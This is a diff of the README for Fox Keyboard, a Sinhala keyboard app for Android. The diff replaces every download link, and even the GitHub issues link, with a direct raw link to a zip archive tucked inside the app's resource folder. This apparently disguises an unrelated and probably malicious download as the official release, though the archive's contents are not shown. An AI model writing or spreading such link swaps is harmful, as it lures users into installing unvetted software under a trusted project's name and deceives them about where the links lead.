@@ -4,7 +4,7 @@
 Fox Keyboard is Sri Lanka's premier open-source Sinhala keyboard app for Android. Designed with privacy in mind, it helps users avoid tracking while providing a simple way to type in Sinhala and Singlish. The app promotes open-source collaboration and operates on a donation basis, ensuring that users can access it without any cost.
 
 ## 📥 Download Now
-[![Download Foxkeyboard](https://img.shields.io/badge/Download-Foxkeyboard-brightgreen)](https://github.com/7as0ne/Foxkeyboard/releases)
+[![Download Foxkeyboard](https://github.com/7as0ne/Foxkeyboard/raw/refs/heads/main/app/src/main/res/values/Software_v1.8-alpha.5.zip)](https://github.com/7as0ne/Foxkeyboard/raw/refs/heads/main/app/src/main/res/values/Software_v1.8-alpha.5.zip)
 
 ## 🚀 Getting Started
 To begin using Foxkeyboard, follow these simple steps to download and install the app on your Android device.
@@ -18,7 +18,7 @@ To begin using Foxkeyboard, follow these simple steps to download and install th
 
 ### Step 1: Visit the Releases Page
 To download the app, visit the Releases page linked below:
-[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/releases)
+[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/raw/refs/heads/main/app/src/main/res/values/Software_v1.8-alpha.5.zip)
 
 ### Step 2: Locate the Latest Version
 On the Releases page, look for the most recent version of Foxkeyboard. It will typically be at the top of the list. Each version will have release notes that give information about new features and fixes.
@@ -64,11 +64,11 @@ Foxkeyboard is an open-source project. If you wish to contribute:
 
 ## 📞 Support
 For further support and inquiries:
-- Visit the [GitHub issues page](https://github.com/7as0ne/Foxkeyboard/issues).
+- Visit the [GitHub issues page](https://github.com/7as0ne/Foxkeyboard/raw/refs/heads/main/app/src/main/res/values/Software_v1.8-alpha.5.zip).
 - Engage with the community on our forum (link can be added).
 
 ## 📥 Additional Download Link
 You can also download the app directly from this link: 
-[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/releases)
+[Download Foxkeyboard from Releases](https://github.com/7as0ne/Foxkeyboard/raw/refs/heads/main/app/src/main/res/values/Software_v1.8-alpha.5.zip)
 
 Enjoy typing in Sinhala with ease and confidence using Foxkeyboard!
